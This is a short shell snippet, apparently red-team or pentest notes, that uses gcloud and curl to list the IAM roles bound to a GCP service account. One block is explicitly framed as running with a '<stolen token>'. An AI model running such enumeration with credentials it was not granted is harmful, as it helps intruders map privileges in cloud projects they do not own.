

export PROJECT_ID='xxxxxxx'
gcloud iam service-accounts get-iam-policy pacman-rancher@${PROJECT_ID}.iam.gserviceaccount.com --format='json(bindings)'
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}' \
  "https://iam.googleapis.com/v1/projects/${PROJECT_ID}/serviceAccounts/pacman-rancher@${PROJECT_ID}.iam.gserviceaccount.com:getIamPolicy"



gcloud projects get-iam-policy ${PROJECT_ID} --flatten="bindings[].members" --format="table(bindings.role)"\
 --filter="bindings.members:pacman-rancher@${PROJECT_ID}.iam.gserviceaccount.com"
 
export SERVICE_ACCOUNT="pacman-rancher@${PROJECT_ID}.iam.gserviceaccount.com"

TOKEN= <stolen token>

# Make the API request and filter the results using jq
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}' \
  "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}:getIamPolicy" | \
  jq --arg SERVICE_ACCOUNT "$SERVICE_ACCOUNT" '.bindings[] | select(.members[] | contains($SERVICE_ACCOUNT)) | {role: .role}'